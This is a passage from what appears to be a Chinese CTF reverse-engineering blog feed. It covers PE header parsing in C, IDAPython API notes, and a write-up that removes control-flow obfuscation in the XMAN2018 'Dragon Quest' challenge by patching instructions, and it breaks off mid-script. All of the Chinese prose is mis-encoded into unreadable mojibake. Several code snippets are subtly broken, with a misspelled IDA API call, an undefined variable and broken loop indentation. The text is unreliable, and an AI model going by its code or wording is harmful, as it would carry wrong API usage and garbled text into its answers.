HERE&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>);<br>    <br>    <span class="hljs-comment">//å°†æ–‡ä»¶è¯»å–åˆ°ç¨‹åºä¸­</span><br>    <span class="hljs-type">int</span> size = Size(fp);<br>    buffer = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(size);<br>    fread(buffer,size,<span class="hljs-number">1</span>,fp);<br><br>    PE_info(fp,buffer);<br><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>DOSå¤´ä¸­ç¬¬ä¸€ä¸ªæˆå‘˜<code>e_magic</code>å’Œæœ€åä¸€ä¸ªæˆå‘˜<code>e_lfanew</code>æœ€é‡è¦ï¼Œå‰è€…æ˜¯å¯æ‰§è¡Œæ–‡ä»¶çš„æ ‡å¿—MZï¼Œåè€…æ˜¯NTå¤´çš„æ–‡ä»¶åç§»</p><p>NTå¤´åˆ†ä¸‰ä¸ªéƒ¨åˆ†ï¼Œåˆ†åˆ«æ˜¯</p><ul><li><p>Signature - PE</p></li><li><p>æ ‡å‡†PEå¤´ï¼Œå…¶é‡è¦æˆå‘˜</p><ul><li>Machine å¯ä»¥è¿è¡Œåœ¨ä»€ä¹ˆæ ·çš„CPU</li><li>NumberofSections èŠ‚çš„æ•°é‡</li><li>TimeDateStamp æ—¶é—´æˆ³</li><li>SizeOfOptionalHeader å¯é€‰PEå¤´å¤§å°</li><li>Characteristics æ–‡ä»¶å±æ€§</li></ul></li><li><p>å¯é€‰PEå¤´ï¼Œå…¶é‡è¦æˆå‘˜ä¸”ä»æœ‰ç”¨æˆåˆ†</p><ul><li>Magic    è¯¥PEæ–‡ä»¶æ˜¯ä»€ä¹ˆç±»å‹çš„ 10B 32ä½PE &#x2F;&#x2F; 20B 64ä½PE &#x2F;&#x2F; 107 ROMæ˜ åƒ</li><li>AddressOfEntryPoint ç¨‹åºå…¥å£ï¼Œå³æ‰€è°“çš„OEP</li><li>ImageBase   ç¨‹åºçš„ä¼˜å…ˆè£…è½½åœ°å€</li><li>SectionAlignment  å†…å­˜ä¸­èŠ‚çš„å¯¹é½ç²’åº¦</li><li>FileAlignment  æ–‡ä»¶ä¸­èŠ‚çš„å¯¹é½ç²’åº¦</li><li>SizeOfImage æ˜ åƒå¤§å°</li><li>SizeOfHeaders æ‰€æœ‰èŠ‚è¡¨å¯¹é½åçš„å¤§å°</li><li>SizeOfStackCommit  åˆå§‹åŒ–æ—¶å®é™…æäº¤çš„æ ˆçš„å¤§å°</li><li>SizeOfHeapReserve   åˆå§‹åŒ–æ—¶å®é™…æäº¤çš„å †çš„å¤§å°</li><li>NumberOfRvaAndSizes ç›®å½•é¡¹</li><li>ï¼ˆæ— ç”¨ä½†ä¿ç•™çš„å­—æ®µåŸºæœ¬éƒ½æ˜¯ä¸ºäº†å…¼å®¹ï¼‰</li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Reverse</category>
      
      <category>PE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>reverse</tag>
      
      <tag>PE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>IDApython ç¬”è®°</title>
    <link href="/2023/06/24/IDApython/"/>
    <url>/2023/06/24/IDApython/</url>
    
    <content type="html"><![CDATA[<p>IDApythonå­¦ä¹ ç¬”è®°</p><span id="more"></span><h2 id="åŸºæœ¬æŒ‡ä»¤"><a href="#åŸºæœ¬æŒ‡ä»¤" class="headerlink" title="åŸºæœ¬æŒ‡ä»¤"></a>åŸºæœ¬æŒ‡ä»¤</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python">ea = here() <span class="hljs-comment">#å½“å‰å…‰æ ‡å¤„åœ°å€</span><br><br>asm = idc.GetDisasm(ea) <span class="hljs-comment"># è·å–å½“å‰åœ°å€çš„æ•´å¥æ±‡ç¼–æŒ‡ä»¤ å¦‚ mov rax 1</span><br>op = idc.print_insn_mnem(ea) <span class="hljs-comment"># è·å–å½“å‰åœ°å€æ±‡ç¼–æ“ä½œï¼Œå¦‚ mov </span><br>operand = idc.print_operand(ea,<span class="hljs-number">0</span>) <span class="hljs-comment"># è·å–å½“å‰åœ°å€æ±‡ç¼–æ“ä½œçš„æ“ä½œæ•°ï¼Œ0æ˜¯ç¬¬ä¸€ä¸ªæ“ä½œæ•°ï¼Œ1æ˜¯ç¬¬äºŒä¸ªæ“ä½œæ•°ï¼Œå¦‚æœè¶…è¿‡è¿”å›ç©º</span><br><br>_prev_ins = idc.prev_head(ea) <span class="hljs-comment"># ä¸Šä¸€æ¡æŒ‡ä»¤åœ°å€</span><br>_next_ins = idc.next_head(ea) <span class="hljs-comment"># ä¸‹ä¸€æ¡æŒ‡ä»¤åœ°å€</span><br><br>_prev_addr = idc.prev_addr(ea) <span class="hljs-comment"># ä¸Šä¸€æ¡æŒ‡ä»¤åœ°å€ è¿™é‡Œåœ°å€æ˜¯è¿ç»­çš„ æ¯”å¦‚ea = 0x4002 åˆ™è¿”å›0x4001</span><br>_next_addr = idc.next_addr(ea) <span class="hljs-comment"># ä¸‹ä¸€æ¡æŒ‡ä»¤åœ°å€ è¿™é‡Œåœ°å€æ˜¯è¿ç»­çš„ æ¯”å¦‚ea = 0x4001 åˆ™è¿”å›0x4002 </span><br><br>seg_name = idc.get_segm_name(ea) <span class="hljs-comment">#å½“å‰åœ°å€æ‰€å¤„æ®µ</span><br><span class="hljs-keyword">for</span> seg <span class="hljs-keyword">in</span> Segments(): <span class="hljs-comment"># è·å¾—æ¯ä¸ªæ®µèµ·å§‹åœ°å€ è¿”å›å€¼ä¸ºæ¯ä¸ªæ®µèµ·å§‹åœ°å€</span><br>    <span class="hljs-built_in">print</span>(seg)<br><br><span class="hljs-keyword">for</span> func <span class="hljs-keyword">in</span> Functions():<span class="hljs-comment"># è·å¾—æ¯ä¸€ä¸ªå‡½æ•°åå­—</span><br>    <span class="hljs-built_in">print</span>(idc.get_func_name(func))<br><br></code></pre></td></tr></table></figure><h2 id="å‡½æ•°"><a href="#å‡½æ•°" class="headerlink" title="å‡½æ•°"></a>å‡½æ•°</h2><h3 id="åŸºæœ¬æŒ‡ä»¤-1"><a href="#åŸºæœ¬æŒ‡ä»¤-1" class="headerlink" title="åŸºæœ¬æŒ‡ä»¤"></a>åŸºæœ¬æŒ‡ä»¤</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python">name = idc.get_func_name(ea) <span class="hljs-comment">#å½“å‰åœ°å€æ‰€å±å‡½æ•°åå­—</span><br>func = ida_funcs.get_func(ea) <span class="hljs-comment">#å½“å‰åœ°å€æ‰€å±å‡½æ•° è¿”å›ä¸€ä¸ªfunc_tå¯¹è±¡</span><br>func = idaapi.get_func(ea) <span class="hljs-comment">#åŠŸèƒ½åŒä¸Š</span><br><br><span class="hljs-comment"># åˆ©ç”¨func_tå¯¹è±¡ï¼Œæœ‰å¦‚ä¸‹å‡ ä¸ªæ“ä½œ</span><br>func_start = func.start_ea <span class="hljs-comment">#è¯¥å‡½æ•°èµ·å§‹åœ°å€</span><br>func_end = func.end_ea <span class="hljs-comment">#è¯¥å‡½æ•°ç»“æŸåœ°å€ æ³¨æ„ç»“æŸåœ°å€æ˜¯æ­¤å‡½æ•°æœ€åä¸€æ¡æŒ‡ä»¤çš„ä¸‹ä¸€æ¡æŒ‡ä»¤åœ°å€</span><br><br>func_start = idc.get_func_attr(ea, FUNCATTR_START) <span class="hljs-comment"># æ­¤åœ°å€æ‰€å±å‡½æ•°èµ·å§‹åœ°å€ FUNCATTR_STARTæ˜¯å® ç­‰äº0</span><br>func_end = idc.get_func_attr(ea,FUNCATTR_END)<span class="hljs-comment"># æ­¤åœ°å€æ‰€å±å‡½æ•°ç»“æŸåœ°å€ åŒfunc_end FUNCATTR_ENDæ˜¯å® ç­‰äº8</span><br><br><span class="hljs-comment"># è·å–ä¸Šä¸€ä¸ªå‡½æ•°èµ·å§‹åœ°å€</span><br>idc.get_prev_fchunk(ea) <br>idc.get_prev_func(ea) <br><br><span class="hljs-comment"># è·å–ä¸‹ä¸€ä¸ªå‡½æ•°èµ·å§‹åœ°å€</span><br>idc.get_next_fchunk(ea) <br>idc.get_next_func(ea) <br></code></pre></td></tr></table></figure><h3 id="äº¤å‰å¼•ç”¨"><a href="#äº¤å‰å¼•ç”¨" class="headerlink" title="äº¤å‰å¼•ç”¨"></a>äº¤å‰å¼•ç”¨</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python">xrefs = XrefsFrom(ea,<span class="hljs-number">0</span>)<br><span class="hljs-comment"># è¿”å›ä¸€ä¸ªxrefåˆ—è¡¨å¯¹è±¡ï¼Œä»¥æ­¤eaä¸ºèµ·ç‚¹ï¼Œå¯ä»¥æœ‰å¦‚ä¸‹æ“ä½œ</span><br><span class="hljs-keyword">for</span> xref <span class="hljs-keyword">in</span> xrefs:<br>xref.frm <span class="hljs-comment"># èµ·ç‚¹ </span><br>xref.to <span class="hljs-comment"># ç»ˆç‚¹ï¼Œå³æ­¤å‡½æ•°å¯ä»¥è·³å»å“ª</span><br><span class="hljs-comment">#ç¬¬äºŒä¸ªå‚æ•°æ˜¯é€‰å–äº¤å‰å¼•ç”¨èŒƒå›´ï¼Œ0,é»˜è®¤æ˜¯å…¨éƒ¨ ,1 æ˜¯è¿œè·³è½¬ 2 æ˜¯æ•°æ®å¼•ç”¨</span><br><br>xrefx = XrefsTo(ea,<span class="hljs-number">0</span>)<br><span class="hljs-comment"># è¿”å›ä¸€ä¸ªxrefåˆ—è¡¨å¯¹è±¡ï¼Œä»¥æ­¤eaä¸ºç»ˆç‚¹ï¼Œå¯ä»¥æœ‰å¦‚ä¸‹æ“ä½œ</span><br><span class="hljs-keyword">for</span> xref <span class="hljs-keyword">in</span> xrefs:<br>xref.frm <span class="hljs-comment"># ä½•å¤„æ¥ï¼Œå³è°è°ƒç”¨äº†å®ƒ</span><br>xref.to <span class="hljs-comment"># ä½•å¤„å»ï¼Œå³å®ƒå¯ä»¥å»å“ªé‡Œ</span><br><span class="hljs-comment">#ç¬¬äºŒä¸ªå‚æ•°æ˜¯é€‰å–äº¤å‰å¼•ç”¨èŒƒå›´ï¼Œ0,é»˜è®¤æ˜¯å…¨éƒ¨ ,1 æ˜¯è¿œè·³è½¬ 2 æ˜¯æ•°æ®å¼•ç”¨</span><br><span class="hljs-comment"># ä¸€èˆ¬ç”¨æ­¤å‡½æ•°æ‰¾å¼•ç”¨</span><br><br>xref = CodeRefsFrom(ea,<span class="hljs-number">0</span>)<br><span class="hljs-comment"># ä¸ XrefsFromå«ä¹‰ä¸€æ ·ï¼Œä¸è¿‡è¿”å›çš„æ˜¯listå¯¹è±¡ï¼Œä¹Ÿåªæœ‰è¿œè·³è½¬ï¼Œç¬¬äºŒå‚æ•°æ§åˆ¶æµå‘ï¼Œå³ä¸Šé¢çš„ frm å’Œ to å¯¹åº”</span><br>xref = CodeRefsTo(ea,<span class="hljs-number">0</span>)<br><span class="hljs-comment"># ä¸ XrefsToå«ä¹‰ä¸€æ ·ï¼Œä¸è¿‡è¿”å›çš„æ˜¯listå¯¹è±¡ï¼Œç¬¬äºŒå‚æ•°æ§åˆ¶æµå‘ï¼Œå³ä¸Šé¢çš„ frm å’Œ to å¯¹åº”</span><br><br>ref = ida_xref.get_first_dref_to(addr) <br><span class="hljs-comment"># å¾—åˆ°å¼•ç”¨æ­¤å˜é‡çš„é¦–æ¡è¯­å¥åœ°å€ å¦‚æœæ²¡æœ‰è¿”å›-1 è¿™ä¸ªæ˜¯ä»…å˜é‡çš„äº¤å‰å¼•ç”¨ æ— æ³•æŸ¥çœ‹å‡½æ•°çš„äº¤å‰å¼•ç”¨ï¼Œä½†æ˜¯XrefXXXXéƒ½å¯ä»¥æŸ¥çœ‹</span><br>nex_ref = ida_xref.ger_next_derf_to(addr,ref)<br><span class="hljs-comment"># å¾—åˆ°å¼•ç”¨æ­¤å˜é‡çš„åœ¨refçš„ä¸‹æ¡è¯­å¥åœ°å€ å¦‚æœæ²¡æœ‰è¿”å›-1 è¿™ä¸ªæ˜¯ä»…å˜é‡çš„äº¤å‰å¼•ç”¨ æ— æ³•æŸ¥çœ‹å‡½æ•°çš„äº¤å‰å¼•ç”¨ï¼Œä½†æ˜¯XrefXXXXéƒ½å¯ä»¥æŸ¥çœ‹</span><br><br>func_addr =idc.get_name_ea_simple(func_name) <span class="hljs-comment"># é€šè¿‡å‡½æ•°åå­—è·å¾—è¯¥å‡½æ•°åœ°å€ å¦‚æœæ²¡æœ‰è¯¥å‡½æ•°è¿”å›-1</span><br></code></pre></td></tr></table></figure><h3 id="ä¸€äº›ä¸ªäº¤å‰å¼•ç”¨ä½¿ç”¨æ–¹å¼"><a href="#ä¸€äº›ä¸ªäº¤å‰å¼•ç”¨ä½¿ç”¨æ–¹å¼" class="headerlink" title="ä¸€äº›ä¸ªäº¤å‰å¼•ç”¨ä½¿ç”¨æ–¹å¼"></a>ä¸€äº›ä¸ªäº¤å‰å¼•ç”¨ä½¿ç”¨æ–¹å¼</h3><p>patchæ‰æ‰€æœ‰callå±é™©å‡½æ•°çš„åœ°æ–¹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">danger_func = [<span class="hljs-string">&#x27;gets&#x27;</span>,<span class="hljs-string">&#x27;free&#x27;</span>]<br><span class="hljs-keyword">for</span> func <span class="hljs-keyword">in</span> danger_func:<br>    func_addr = idc.get_name_ea_simple(func)<br>    xrefs = CodeRefsTo(func_addr,<span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">for</span> xref <span class="hljs-keyword">in</span> xrefs:<br>        <span class="hljs-keyword">if</span> idc.GetDisasm(xref).startswith(<span class="hljs-string">&#x27;call&#x27;</span>):<br>            <span class="hljs-built_in">len</span> = next_head(xref) - xref<br>            idaapi.patch_bytes(xref,<span class="hljs-string">b&#x27;\x90&#x27;</span>*<span class="hljs-built_in">len</span>)<br></code></pre></td></tr></table></figure><p>å¤„ç†eaåˆ°endä¹‹é—´æ‰€æœ‰çš„æ•°æ®</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> addr <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(ea,end,<span class="hljs-number">4</span>):<br>    xrefs = XrefsTo(ea)<br>    <span class="hljs-keyword">for</span> xref <span class="hljs-keyword">in</span> xrefs:<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;mov&#x27;</span> <span class="hljs-keyword">in</span> GetDisasm(xref.frm):<br>            <span class="hljs-comment"># your method</span><br></code></pre></td></tr></table></figure><h2 id="Block"><a href="#Block" class="headerlink" title="Block"></a>Block</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python">ea = here()<br>func = idaapi.get_func(ea)<br>CFG = idaapi.FlowChart(func) <span class="hljs-comment"># æ­¤å‡½æ•°çš„CFG</span><br><br><span class="hljs-keyword">for</span> blocks <span class="hljs-keyword">in</span> CFG:<br>    <span class="hljs-built_in">print</span>(blocks.start_ea) <span class="hljs-comment"># æ¯ä¸€ä¸ªblockçš„èµ·å§‹åœ°å€</span><br>    <span class="hljs-built_in">print</span>(block.end_ea) <span class="hljs-comment"># æ¯ä¸€ä¸ªblockçš„ç»“æŸåœ°å€ ä½†æ³¨æ„ ç»“æŸåœ°å€æ˜¯ä¸‹ä¸€ä¸ªblockçš„èµ·å§‹åœ°å€</span><br>    <span class="hljs-built_in">print</span>()<br>    <br>    <span class="hljs-keyword">for</span> succ <span class="hljs-keyword">in</span> blocks.succs(): <span class="hljs-comment"># æ¯ä¸€ä¸ªblockçš„åç»§</span><br>        <span class="hljs-built_in">print</span>(succ.start_ea)<br>        <span class="hljs-built_in">print</span>(succ.end_ea)<br>        <br>   <span class="hljs-keyword">for</span> pred <span class="hljs-keyword">in</span> blocks.preds() <span class="hljs-comment"># æ¯ä¸€ä¸ªblockçš„å‰é©±</span><br>  <span class="hljs-built_in">print</span>(pred.start_ea)<br>        <span class="hljs-built_in">print</span>(pred.end_ea)<br><br></code></pre></td></tr></table></figure><h2 id="è·å–æ•°æ®"><a href="#è·å–æ•°æ®" class="headerlink" title="è·å–æ•°æ®"></a>è·å–æ•°æ®</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">idc.get_wide_byte(ea) // è·å–å•å­—èŠ‚<br>idc.get_wide_word(ea) // è·å–ä¸€ä¸ªå­—<br>idc.get_wide_dword(ea) // è·å–åŒå­—<br>idc.get_qword(ea) // è·å–å››å­—<br>idc.GetFloat(ea) <br>idc.GetDouble(ea)<br></code></pre></td></tr></table></figure><h2 id="è¡¥ä¸"><a href="#è¡¥ä¸" class="headerlink" title="è¡¥ä¸"></a>è¡¥ä¸</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">patch_byte(ea, value)<br>patch_word(ea, value)<br>patch_dword(ea, value)<br>patch_qword(ea, value)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Reverse</category>
      
      <category>IDApython</category>
      
    </categories>
    
    
    <tags>
      
      <tag>reverse</tag>
      
      <tag>idapython</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XMAN2018 æ’ä½èµ› Dragon Quest</title>
    <link href="/2023/06/02/wyvern/"/>
    <url>/2023/06/02/wyvern/</url>
    
    <content type="html"><![CDATA[<p>è®°å½•ä¸€é“ååˆ†niceçš„é¢˜ç›®</p><span id="more"></span><p>æˆ‘è§‰å¾—è¿™é“é¢˜å‡ºå¾—ååˆ†å¾—å¥½ï¼Œå®ƒé‡‡å–äº†è¾ƒä¸ºç®€å•çš„æ§åˆ¶æµæ··æ·†ï¼Œå¯ä»¥ä½¿ç”¨angræ¢å¤å‡ºåŸæœ¬çš„é€»è¾‘ï¼Œä¹Ÿå¯ä»¥ç”¨idapythonç›´æ¥patchå»æ··æ·†ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥ç›´æ¥ä½¿ç”¨angrè·‘å‡ºflagï¼Œä½†è¿™æ ·å°±å¤±å»äº†è¿™é¢˜æœ¬èº«çš„æ„ä¹‰äº†ã€‚</p><h3 id="æ··æ·†"><a href="#æ··æ·†" class="headerlink" title="æ··æ·†"></a>æ··æ·†</h3><p>è¿™é¢˜é‡‡å–çš„æ˜¯æ§åˆ¶æµæ··æ·†ï¼Œä¹Ÿå°±æ˜¯å¢åŠ ä¸€äº›æ— å…³ç´§è¦çš„å˜é‡ï¼Œä»¥è¿™äº›å˜é‡ä¹‹é—´çš„ç¨€å¥‡å¤æ€ªçš„è¿ç®—ä½œä¸ºæ§åˆ¶æ¡ä»¶ï¼Œå†åœ¨å„ä¸ªå—ä¸­è·³æ¥è·³å»ã€‚</p><p>ä»¥è¿™é¢˜ä¸­ä¸€ä¸ªå…³é”®å‡½æ•°<code>start_quest</code> æ¥çœ‹ï¼Œå¯ä»¥å‘ç°é‡Œé¢æœ‰å¾ˆå¤š<code>y26 &gt;= 10 &amp;&amp; (x25-1) * (x25 &amp; 1) !=0</code>ç­‰è¯¸å¦‚æ­¤ç±»çš„æ§åˆ¶æ¡ä»¶ï¼Œå¹¶ä¸”åå¤å‡ºç°ç›¸åŒçš„è¯­å¥å»æ§åˆ¶ã€‚</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202306021959458.png" alt="1.png"></p><p>å†çœ‹çœ‹å®ƒçš„CFG</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202306022006460.png" alt="3.png"></p><p>ç»™äººçš„æ„Ÿè§‰å°±æ˜¯å†—é•¿ã€ç¹çã€‚ç„¶è€Œç›¸æ¯”äºå®ƒçš„å¤§å“¥æ§åˆ¶æµå¹³å¦åŒ–ï¼Œè¿™è¿˜æ˜¯æ¯”è¾ƒå‹å¥½çš„ã€‚</p><h3 id="å»æ··æ·†"><a href="#å»æ··æ·†" class="headerlink" title="å»æ··æ·†"></a>å»æ··æ·†</h3><h4 id="æ€è·¯ä¸€-IDApython"><a href="#æ€è·¯ä¸€-IDApython" class="headerlink" title="æ€è·¯ä¸€ IDApython"></a>æ€è·¯ä¸€ IDApython</h4><p>æˆ‘ä»¬çŸ¥é“äº†è¿™é“é¢˜æ˜¯ä»¥ä¸€äº›æ— å…³å˜é‡æ¥æ“æ§æ§åˆ¶æµï¼Œä»¥è¾¾åˆ°æ··æ·†ç›®çš„ã€‚å¾ˆè‡ªç„¶çš„ä¸€ä¸ªæƒ³æ³•å°±æ˜¯ï¼Œå¦‚æœè¿™äº›å˜é‡çš„å€¼éƒ½ä¸ä¼šå˜ï¼Œé‚£ä¹ˆæ§åˆ¶è¯­å¥çš„ç»“æœä¸å°±æ˜¯å”¯ä¸€ç¡®å®šçš„å—ã€‚äºæ˜¯ä¹ï¼Œæˆ‘ä»¬æƒ³åˆ°å»æŸ¥çœ‹è¿™äº›å˜é‡çš„å®šä¹‰ä½ç½®ï¼Œä¼šæƒŠå¥‡çš„å‘ç°ï¼Œå®ƒä»¬å…¨éƒ¨éƒ½åœ¨bssæ®µå®šä¹‰ï¼</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202306022013016.png" alt="4.png"></p><p>æˆ‘ä»¬å†äº¤å‰å¼•ç”¨å‡ ä¸ªå˜é‡ï¼Œåˆä¼šæƒŠå¥‡åœ°å‘ç°ï¼Œå®ƒä»¬çš„å€¼å…¨éƒ½æ²¡æœ‰å‘ç”Ÿæ”¹å˜ã€‚</p><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œé‚£äº›æ§åˆ¶è¯­å¥çš„ç»“æœå°±æ˜¯å”¯ä¸€çš„ï¼å¯æ˜¯è¿™æ ·å­çš„è¯ï¼Œé‚£ä¹ˆIDAå°±åº”è¯¥èƒ½åˆ†æå‡ºæ¥å¹¶ä¼˜åŒ–æ‰é‚£äº›ä¸å¯è¾¾è¯­å¥ã€‚ç„¶è€Œäº‹å®å¾ˆæ˜æœ—ï¼Œå¹¶æ²¡æœ‰ã€‚åŸå› åœ¨äºï¼Œåœ¨IDAçœ¼ä¸­ï¼Œè¿™äº›ä»ç„¶æ˜¯å˜é‡ï¼Œåªä¸è¿‡æ˜¯ä¸ä¼šå˜çš„å˜é‡ã€‚</p><p>é‚£ä¹ˆè¿™å°±æœ‰äº†ç¬¬ä¸€ä¸ªpatchæ€è·¯ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬æ‰‹åŠ¨å¸®åŠ©IDAè¯†åˆ«ï¼Œå³æŠŠæ‰€æœ‰çš„è¿™äº›å˜é‡å…¨éƒ¨patchæˆ0ã€‚æ¯”å¦‚è¯´åŸæœ¬æ˜¯<code>mov eax,y26</code>ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±patchæˆ<code>mov eax,0</code>ã€‚å¯èƒ½ä¼šæƒ³åˆ°ï¼Œé‚£è¿™ä¹ˆå¤šçš„å˜é‡ï¼Œæˆ‘å¾—patchåˆ°å•¥æ—¶å€™å‘€ï¼Ÿè¿™ä¸ªæƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å°±åº”è¯¥æƒ³åˆ°å¯ä»¥å€ŸåŠ©IDApythonæ¥å¸®æˆ‘ä»¬å®Œæˆï¼Œæ¯•ç«Ÿ <em>é‡å¤æ€§</em> çš„å·¥ä½œæ˜¯è®¡ç®—æœºæœ€æ“…é•¿çš„ã€‚</p><p>ç›´æ¥ä¸Šè„šæœ¬ï¼Œè„šæœ¬ä¸­ä¼šæœ‰è¯¦ç»†æ³¨é‡Š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> ida_xref<br><br><span class="hljs-comment"># å˜é‡ä½äºbssæ®µçš„èµ·å§‹åœ°å€ä»¥åŠç»ˆæ­¢åœ°å€</span><br>ea = <span class="hljs-number">0x610318</span><br>end = <span class="hljs-number">0x6105A8</span><br>regs = <span class="hljs-built_in">set</span>()<br><br><span class="hljs-comment"># mov å¯„å­˜å™¨,0 å¯¹åº”çš„æœºå™¨ç ï¼Œå¯ä»¥åœ¨IDAä¸­åˆ©ç”¨Assembleä¸€å¥ä¸€å¥è¯•å‡ºæ¥</span><br>pad = <span class="hljs-string">b&#x27;\x90\x90&#x27;</span><br>patch = &#123;<span class="hljs-string">&#x27;eax&#x27;</span>:<span class="hljs-string">b&#x27;\xB8\x00\x00\x00\x00&#x27;</span> + pad,<br>         <span class="hljs-string">&#x27;ebx&#x27;</span>:<span class="hljs-string">b&#x27;\xBB\x00\x00\x00\x00&#x27;</span> + pad,<br>         <span class="hljs-string">&#x27;ecx&#x27;</span>:<span class="hljs-string">b&#x27;\xB9\x00\x00\x00\x00&#x27;</span> + pad,<br>         <span class="hljs-string">&#x27;edx&#x27;</span>:<span class="hljs-string">b&#x27;\xBA\x00\x00\x00\x00&#x27;</span> + pad,<br>         <span class="hljs-string">&#x27;esi&#x27;</span>:<span class="hljs-string">b&#x27;\xBE\x00\x00\x00\x00&#x27;</span> + pad,<br>         <span class="hljs-string">&#x27;edi&#x27;</span>:<span class="hljs-string">b&#x27;\xBF\x00\x00\x00\x00&#x27;</span> + pad,<br>         <span class="hljs-string">&#x27;r8d&#x27;</span>:<span class="hljs-string">b&#x27;\x41\xB8\x00\x00\x00\x00&#x27;</span> + pad,<br>         <span class="hljs-string">&#x27;r9d&#x27;</span>:<span class="hljs-string">b&#x27;\x41\xB9\x00\x00\x00\x00&#x27;</span> + pad,<br>         <span class="hljs-string">&#x27;r10d&#x27;</span>:<span class="hljs-string">b&#x27;\x41\xBA\x00\x00\x00\x00&#x27;</span> + pad,<br>         <span class="hljs-string">&#x27;r11d&#x27;</span>:<span class="hljs-string">b&#x27;\x41\xBB\x00\x00\x00\x00&#x27;</span> + pad,<br>         <span class="hljs-string">&#x27;r12d&#x27;</span>:<span class="hljs-string">b&#x27;\x41\xBC\x00\x00\x00\x00&#x27;</span> + pad,<br>         <span class="hljs-string">&#x27;r13d&#x27;</span>:<span 